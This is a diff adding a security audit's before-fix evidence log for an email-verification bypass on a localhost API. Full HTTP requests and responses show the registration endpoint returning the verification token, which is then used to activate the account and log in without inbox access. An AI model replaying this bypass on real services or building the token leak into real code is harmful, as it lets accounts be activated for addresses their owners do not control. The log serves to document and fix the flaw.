@@ -1,0 +1,121 @@
+================================================================================
+BEFORE-FIX EVIDENCE LOG: V04 (In-Band Email Verification Token Disclosure)
+Timestamp: 2026-09-25T11:59:42+05:30
+Target URLs:
+- Registration: http://localhost:8080/api/v1/auth/register
+- Verification: http://localhost:8080/api/v1/auth/verify-email
+- Login: http://localhost:8080/api/v1/auth/login
+- Protected Resource: http://localhost:8080/api/v1/auth/me
+================================================================================
+
+--- STEP 1: REGISTRATION REQUEST (RECEIVING IN-BAND VERIFICATION TOKEN) ---
+POST /api/v1/auth/register HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/8.9.1
+Content-Type: multipart/form-data; boundary=---------------------------38192837192837192837192837
+
+-----------------------------38192837192837192837192837
+Content-Disposition: form-data; name="firstName"
+
+V04Audit
+-----------------------------38192837192837192837192837
+Content-Disposition: form-data; name="lastName"
+
+Target
+-----------------------------38192837192837192837192837
+Content-Disposition: form-data; name="email"
+
+audit_v04_target@test.com
+-----------------------------38192837192837192837192837
+Content-Disposition: form-data; name="password"
+
+[REDACTED_PASSWORD]
+-----------------------------38192837192837192837192837--
+
+--- REGISTRATION RESPONSE ---
+HTTP/1.1 201 Created
+Content-Type: application/json
+Date: Fri, 25 Sep 2026 06:27:56 GMT
+
+{
+  "message": "User registered. Please check your email for verification.",
+  "profileImageUrl": null,
+  "verificationToken": "780abfb2-7fcf-457d-b961-a008ee367eeb"
+}
+
+--- STEP 2: BASELINE VERIFICATION - LOGIN REJECTED FOR UNVERIFIED ACCOUNT ---
+POST /api/v1/auth/login HTTP/1.1
+Host: localhost:8080
+Content-Type: application/json
+
+{"email": "audit_v04_target@test.com", "password": "[REDACTED_PASSWORD]"}
+
+--- RESPONSE ---
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+Date: Fri, 25 Sep 2026 06:28:26 GMT
+
+{
+  "status": 403,
+  "timestamp": "2026-09-25T06:28:26.201815100Z",
+  "message": "Please verify your email first",
+  "error": "Forbidden"
+}
+
+--- STEP 3: ACTIVATION USING LEAKED IN-BAND TOKEN (NO INBOX ACCESS) ---
+GET /api/v1/auth/verify-email?token=780abfb2-7fcf-457d-b961-a008ee367eeb HTTP/1.1
+Host: localhost:8080
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Fri, 25 Sep 2026 06:28:57 GMT
+
+{
+  "message": "Email verified successfully!"
+}
+
+--- STEP 4: LOGIN SUCCEEDS AFTER UNAUTHORIZED ACTIVATION ---
+POST /api/v1/auth/login HTTP/1.1
+Host: localhost:8080
+Content-Type: application/json
+
+{"email": "audit_v04_target@test.com", "password": "[REDACTED_PASSWORD]"}
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Fri, 25 Sep 2026 06:29:20 GMT
+
+{
+  "message": "Login successful",
+  "accessToken": "[REDACTED_ACCESS_TOKEN]",
+  "refreshToken": "[REDACTED_REFRESH_TOKEN]",
+  "email": "audit_v04_target@test.com",
+  "firstName": "V04Audit",
+  "lastName": "Target",
+  "profileImageUrl": null,
+  "role": "ROLE_USER"
+}
+
+--- STEP 5: AUTHENTICATED ACCESS CONFIRMED ON PROTECTED ENDPOINT ---
+GET /api/v1/auth/me HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer [REDACTED_ACCESS_TOKEN]
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Fri, 25 Sep 2026 06:29:42 GMT
+
+{
+  "email": "audit_v04_target@test.com",
+  "firstName": "V04Audit",
+  "lastName": "Target",
+  "profileImageUrl": null
+}
+
+================================================================================
+RESULT: CONFIRMED VULNERABILITY (V04)
+Status: HTTP 201 Created leaked verification token in-band; token successfully consumed without inbox interaction; account activated from 403 to 200 authenticated state.
+================================================================================
